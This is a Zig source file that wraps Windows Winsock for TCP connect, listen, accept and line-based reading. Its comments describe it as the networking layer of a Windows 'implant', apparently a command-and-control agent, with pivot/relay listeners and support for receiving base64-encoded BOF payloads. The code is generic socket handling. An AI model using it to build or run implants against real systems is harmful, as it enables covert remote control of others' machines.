//! Winsock wrapper — TCP client + listener + line reader.
//!
//! Zig 0.16 removed `std.net` (moved into the experimental `std.Io` framework),
//! so the agent talks win32 winsock directly. The implant is Windows-only, and
//! this gives stable, full control over connect/listen/accept/recv/send plus
//! hostname resolution (getaddrinfo) — matching the Rust implant's
//! `std::net::TcpStream::connect` / `TcpListener` behavior.

const std = @import("std");
const ws2 = std.os.windows.ws2_32;
const windows = std.os.windows;

pub const SOCKET = usize;
pub const INVALID_SOCKET: SOCKET = ~@as(SOCKET, 0);
pub const SOCKET_ERROR: i32 = -1;

const AF_INET: i32 = 2;
const SOCK_STREAM: i32 = 1;
const IPPROTO_TCP: i32 = 6;
const SD_BOTH: i32 = 2;

// addrinfo (winsock) — used by getaddrinfo.
pub const addrinfo = extern struct {
    flags: i32,
    family: i32,
    socktype: i32,
    protocol: i32,
    addrlen: usize,
    canonname: ?[*:0]u8,
    addr: ?*ws2.sockaddr,
    next: ?*addrinfo,
};

pub const WSADATA = extern struct {
    wVersion: u16,
    wHighVersion: u16,
    iMaxSockets: u16,
    iMaxUdpDg: u16,
    lpVendorInfo: ?[*]u8,
    szDescription: [257]u8,
    szSystemStatus: [129]u8,
};

extern "ws2_32" fn WSAStartup(wVersionRequested: u16, lpWSAData: *WSADATA) i32;
extern "ws2_32" fn WSACleanup() i32;
extern "ws2_32" fn socket(af: i32, typ: i32, protocol: i32) SOCKET;
extern "ws2_32" fn connect(s: SOCKET, name: *const ws2.sockaddr, namelen: i32) i32;
extern "ws2_32" fn send(s: SOCKET, buf: [*]const u8, len: i32, flags: i32) i32;
extern "ws2_32" fn closesocket(s: SOCKET) i32;
extern "ws2_32" fn shutdown(s: SOCKET, how: i32) i32;
extern "ws2_32" fn bind(s: SOCKET, name: *const ws2.sockaddr, namelen: i32) i32;
extern "ws2_32" fn getaddrinfo(
    node: ?[*:0]const u8,
    service: ?[*:0]const u8,
    hints: ?*const addrinfo,
    result: *?*addrinfo,
) i32;
extern "ws2_32" fn freeaddrinfo(ai: *addrinfo) void;

// recv / listen / accept collide with method names, so bind them via @extern
// with an explicit winsock symbol name (the Zig identifier differs from the
// export name).
const ws_recv = @extern(*const fn (SOCKET, [*]u8, i32, i32) callconv(.c) i32, .{ .name = "recv" });
const ws_listen = @extern(*const fn (SOCKET, i32) callconv(.c) i32, .{ .name = "listen" });
const ws_accept = @extern(*const fn (SOCKET, ?*ws2.sockaddr, ?*i32) callconv(.c) SOCKET, .{ .name = "accept" });

var started: bool = false;

/// One-time winsock init. Idempotent.
pub fn init() void {
    if (started) return;
    var data: WSADATA = undefined;
    _ = WSAStartup(0x0202, &data); // request 2.2
    started = true;
}

/// A connected TCP stream (client or accepted child).
pub const Stream = struct {
    s: SOCKET,

    pub fn close(self: Stream) void {
        _ = closesocket(self.s);
    }

    pub fn shutdownBoth(self: Stream) void {
        _ = shutdown(self.s, SD_BOTH);
    }

    /// Blocking send; returns bytes sent or error.
    pub fn sendAll(self: Stream, buf: []const u8) !void {
        var sent: usize = 0;
        while (sent < buf.len) {
            const n = send(self.s, buf.ptr + sent, @intCast(buf.len - sent), 0);
            if (n == SOCKET_ERROR) return error.SendFailed;
            if (n == 0) return error.ConnectionClosed;
            sent += @intCast(n);
        }
    }

    /// Blocking recv; returns 0 on clean close, n>0 bytes otherwise.
    pub fn recv(self: Stream, buf: []u8) !usize {
        const n = ws_recv(self.s, buf.ptr, @intCast(buf.len), 0);
        if (n == SOCKET_ERROR) return error.RecvFailed;
        return @intCast(n);
    }
};

/// Connect to `host:port` (host may be a name or a numeric IP). Blocking.
pub fn dial(host: []const u8, port: u16) !Stream {
    init();

    var host_buf: [256]u8 = undefined;
    if (host.len >= host_buf.len) return error.NameTooLong;
    @memcpy(host_buf[0..host.len], host);
    host_buf[host.len] = 0;
    const node: [*:0]const u8 = host_buf[0..host.len :0];

    var port_buf: [16]u8 = [_]u8{0} ** 16;
    const port_str = std.fmt.bufPrint(&port_buf, "{d}", .{port}) catch unreachable;
    const service: [*:0]const u8 = port_buf[0..port_str.len :0];

    var hints: addrinfo = std.mem.zeroes(addrinfo);
    hints.family = AF_INET; // IPv4
    hints.socktype = SOCK_STREAM;

    var res: ?*addrinfo = null;
    const gai = getaddrinfo(node, service, &hints, &res);
    if (gai != 0 or res == null) return error.ResolveFailed;
    defer freeaddrinfo(res.?);

    var ai: ?*addrinfo = res;
    while (ai) |info| : (ai = info.next) {
        if (info.addr == null) continue;
        const s = socket(info.family, info.socktype, info.protocol);
        if (s == INVALID_SOCKET) continue;
        const rc = connect(s, info.addr.?, @intCast(info.addrlen));
        if (rc == 0) return Stream{ .s = s };
        _ = closesocket(s);
    }
    return error.ConnectFailed;
}

/// A bound TCP listener (for pivot/relay).
pub const Listener = struct {
    s: SOCKET,
    bound_port: u16,

    pub fn close(self: Listener) void {
        _ = closesocket(self.s);
    }

    /// Blocking accept. Returns an accepted child stream, or error.
    pub fn accept(self: Listener) !Stream {
        const cs = ws_accept(self.s, null, null);
        if (cs == INVALID_SOCKET) return error.AcceptFailed;
        return Stream{ .s = cs };
    }
};

/// Bind `bind_ip:port` (port 0 = OS-assigned). `bind_ip` should be a numeric
/// IPv4 (e.g. "0.0.0.0", "127.0.0.1"). Returns the listener + actual port.
pub fn listen(bind_ip: []const u8, port: u16) !Listener {
    init();

    // Parse numeric IPv4 directly (relay binds are always numeric).
    var sa: ws2.sockaddr.in = .{
        .family = AF_INET,
        .port = htons(port),
        .addr = inetAddr(bind_ip) orelse return error.BadAddress,
    };

    const s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return error.SocketFailed;

    // Allow quick rebind after stop.
    var on: i32 = 1;
    _ = setsockopt(s, 0xffff, 0x4, @ptrCast(&on), @sizeOf(i32)); // SO_REUSEADDR

    const rc = bind(s, @ptrCast(&sa), @sizeOf(ws2.sockaddr.in));
    if (rc == SOCKET_ERROR) {
        _ = closesocket(s);
        return error.BindFailed;
    }
    if (ws_listen(s, 16) == SOCKET_ERROR) {
        _ = closesocket(s);
        return error.ListenFailed;
    }

    // Recover the actual bound port (matters when port 0 was requested).
    var local: ws2.sockaddr.in = undefined;
    var local_len: i32 = @sizeOf(ws2.sockaddr.in);
    if (getsockname(s, @ptrCast(&local), &local_len) == SOCKET_ERROR) {
        _ = closesocket(s);
        return error.GetsocknameFailed;
    }
    return .{ .s = s, .bound_port = ntohs(local.port) };
}

extern "ws2_32" fn setsockopt(
    s: SOCKET,
    level: i32,
    optname: i32,
    optval: [*]const u8,
    optlen: i32,
) i32;
extern "ws2_32" fn getsockname(s: SOCKET, name: *ws2.sockaddr, namelen: *i32) i32;
extern "ws2_32" fn htons(hostshort: u16) u16;
extern "ws2_32" fn ntohs(netshort: u16) u16;

/// Parse a numeric dotted-quad into network-order u32 (like inet_addr, but
/// without the winsock dependency on an extra import).
fn inetAddr(s: []const u8) ?u32 {
    var parts: [4]u32 = .{ 0, 0, 0, 0 };
    var idx: usize = 0;
    var it = std.mem.splitScalar(u8, s, '.');
    while (it.next()) |seg| {
        if (idx >= 4) return null;
        parts[idx] = std.fmt.parseInt(u32, seg, 10) catch return null;
        if (parts[idx] > 255) return null;
        idx += 1;
    }
    if (idx != 4) return null;
    // sockaddr.in.addr is network byte order: in-memory bytes are [a, b, c, d].
    // On a little-endian host that is the u32 value a | (b<<8) | (c<<16) | (d<<24).
    return parts[0] | (parts[1] << 8) | (parts[2] << 16) | (parts[3] << 24);
}

/// Buffered line reader over a Stream. Splits on `\n`, strips trailing `\r`.
/// Uses a growable buffer so arbitrarily large BOF payloads (a base64'd COFF
/// can be tens of KB on one line) don't overflow.
pub const LineReader = struct {
    stream: Stream,
    buf: std.ArrayList(u8) = .empty,
    pos: usize = 0,

    pub fn deinit(self: *LineReader, alloc: std.mem.Allocator) void {
        self.buf.deinit(alloc);
    }

    /// Reads the next line (without the trailing newline). Returns null on
    /// clean close. The returned slice is valid until the next call.
    pub fn readLine(self: *LineReader, alloc: std.mem.Allocator) !?[]const u8 {
        while (true) {
            if (self.pos < self.buf.items.len) {
                if (std.mem.indexOfScalarPos(u8, self.buf.items, self.pos, '\n')) |nl| {
                    var end = nl;
                    if (end > self.pos and self.buf.items[end - 1] == '\r') end -= 1;
                    const line = self.buf.items[self.pos..end];
                    self.pos = nl + 1;
                    return line;
                }
            }
            // Compact: drop consumed bytes, then recv more.
            if (self.pos > 0) {
                const remain = self.buf.items.len - self.pos;
                std.mem.copyForwards(u8, self.buf.items[0..remain], self.buf.items[self.pos..]);
                self.buf.shrinkRetainingCapacity(remain);
                self.pos = 0;
            }
            var scratch: [8192]u8 = undefined;
            const n = try self.stream.recv(&scratch);
            if (n == 0) return null;
            try self.buf.appendSlice(alloc, scratch[0..n]);
        }
    }
};
